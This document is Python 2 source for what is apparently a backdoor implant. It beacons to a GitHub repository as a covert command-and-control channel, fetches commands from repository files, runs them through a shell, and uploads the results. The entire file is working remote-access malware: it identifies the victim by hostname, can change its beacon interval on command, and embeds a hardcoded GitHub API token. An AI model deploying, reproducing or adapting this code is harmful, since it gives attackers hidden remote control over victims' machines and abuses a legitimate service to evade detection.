#coding:utf-8
import sys
reload(sys)
sys.setdefaultencoding('utf-8')
import requests
import base64
import json
import random
import socket
import time
import subprocess
import threading

B_GITHUB_URL = 'https://api.github.com/'
B_TOKEN = '011e2b198144e15b89cd19984e123a680c86c543'
B_USER = 'fuck123fuckabc'
B_PROJECT = 'test'
B_PATH = 'tw'
B_ACTION_HEART = 'heart'
B_ACTION_CMD = 'cmd'
B_ACTION_ANSWER = 'answer'

###########################
B_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36'

def get_id():
    _t = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba',5))
    _t = 'abcddddd'
    _sid = base64.b64encode(_t)
    try:
        _sid = base64.b64encode(socket.gethostname()+'+'+_t)
    except:
        pass
    return _sid
class BackGithub:
    back_sid = get_id()
    def __init__(self):
        #self.back_sid = self._get_id()
        self.back_git_heart = "https://api.github.com/repos/{}/{}/contents/{}/{}/{}".format(B_USER, B_PROJECT, B_PATH, B_ACTION_HEART,self.back_sid)
        self.back_git_cmd = "https://api.github.com/repos/{}/{}/contents/{}/{}/{}".format(B_USER, B_PROJECT, B_PATH, B_ACTION_CMD,self.back_sid)
        self.back_git_answer = "https://api.github.com/repos/{}/{}/contents/{}/{}/{}".format(B_USER, B_PROJECT, B_PATH, B_ACTION_ANSWER,self.back_sid)
        
        self.back_function = BackFunction()
                
    def _get_git_hash(self, git_url):
        _result_status = False
        _result_data = ''
        headers = {"Authorization": 'token '+B_TOKEN, 'user-agent': B_USER_AGENT}
        try:
            r = requests.get(url=git_url, headers=headers)
            if r.status_code == 200:
                _result_data = json.loads(r.text)['sha']
                _result_status = True
        except Exception, e:
            pass
        return _result_status, _result_data

    def _get_git_all(self, git_url):
        _result_status = False
        _result_data = ''
        headers = {"Authorization": 'token '+B_TOKEN, 'user-agent': B_USER_AGENT}
        try:
            r = requests.get(url=git_url, headers=headers)
            if r.status_code == 200:
                _result_data = json.loads(r.text)
                _result_status = True
        except Exception, e:
            pass
        return _result_status, _result_data
    
    def _put_git_heart(self):
        _result_status = False
        _status, _sha = self._get_git_hash(self.back_git_heart)
        _t = time.strftime('%Y-%m-%d %H:%M:%S',time.localtime(time.time()))
        d = {
           "message": "my commit message",
           "content": base64.b64encode(_t),
           "sha": _sha
        }
        headers = {"Authorization": 'token '+B_TOKEN, 'user-agent': B_USER_AGENT}
        try:
            r = requests.put(url=self.back_git_heart, data=json.dumps(d), headers=headers)
            if not _status and r.status_code == 201:
                _result_status = True
            if _sha and r.status_code == 200:
                _result_status = True
        except Exception, e:
            pass
        return _result_status
    
    def _put_git_answer(self, data):
        _result_status = False
        _status, _sha = self._get_git_hash(self.back_git_answer)
        d = {
           "message": "my commit message",
           "content": base64.b64encode(data),
           "sha": _sha
        }
        headers = {"Authorization": 'token '+B_TOKEN, 'user-agent': B_USER_AGENT}
        try:
            r = requests.put(url=self.back_git_answer, data=json.dumps(d), headers=headers)
            if not _status and r.status_code == 201:
                _result_status = True
            if _sha and r.status_code == 200:
                _result_status = True
        except Exception, e:
            pass
        return _result_status
    
    def _get_git_cmd(self):
        _status = False
        _data = ''
        status, data = self._get_git_all(self.back_git_cmd)
        if status:
            headers = {"Authorization": 'token '+B_TOKEN, 'user-agent': B_USER_AGENT}
            try:
                _data = base64.b64decode(data['content'])
                _status = True
                d = {
                   "message": "my commit message",
                   "sha": data['sha']
                }
                requests.delete(url=self.back_git_cmd, data=json.dumps(d), headers=headers)
            except:
                pass
        return _status, _data

    def _del_git_cmd(self):
        _result_status = False
        _status, _sha = self._get_git_hash(self.back_git_cmd)
        print _status, _sha
        if _status:
            d = {
               "message": "my commit message",
               "sha": _sha
            }
            headers = {"Authorization": 'token '+B_TOKEN, 'user-agent': B_USER_AGENT}
            try:
                r = requests.delete(url=self.back_git_cmd, data=json.dumps(d), headers=headers)
                if r.status_code == 200:
                    _result_status = True
            except Exception, e:
                pass
        return _result_status
    
    def start(self):
        print self.back_sid
        print self._put_git_heart()
        status, command = self._get_git_cmd()
        print status, command
        if status:
            result = self.back_function.back_cmd(command)
            print result
            self._put_git_answer(result)
        
class BackFunction:
    def __init__(self):
        pass
    def back_cmd(self, command):
        _t_data = 'timeout'
        p =subprocess.Popen(command, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, universal_newlines=True)
        _t = 10
        while _t > 0:
            time.sleep(1)
            if p.poll() == 0:
                _t_data = p.stdout.read() + p.stderr.read()
                break
            _t = _t - 1
        return _t_data 



class BackHeart:
    def __init__(self, back_github=BackGithub(), back_function=BackFunction(), back_min_time=10):
        self.back_github = back_github
        self.back_function = back_function
        self.back_min_time = back_min_time
    
    def do_cmd(self):
        status, command = self.back_github._get_git_cmd()
        result = None
        if status:
            _t = command.split(' ')
            if command.startswith('sleep') and len(_t) == 2 and _t[1].isdigit():
                self.back_min_time = int(_t[1])
                result = 'sleep change to '+_t[1]
                self.back_github._put_git_answer(result)
                return False
            else:
                result = self.back_function.back_cmd(command)
                if self.back_github._put_git_answer(result):
                    return True
        return False

    def start(self):
        _back_time = 0
        _back_busy = 0
        while True:
            if self.do_cmd():
                _back_busy = 20
            if _back_busy > 0:
                time.sleep(1)
                _back_busy = _back_busy - 1
                continue

            if self.back_github._put_git_heart():
                _back_time = self.back_min_time
            else:
                _back_time = _back_time + self.back_min_time
            time.sleep(_back_time)

if __name__ == '__main__':
    heart = BackHeart()
    heart.start()

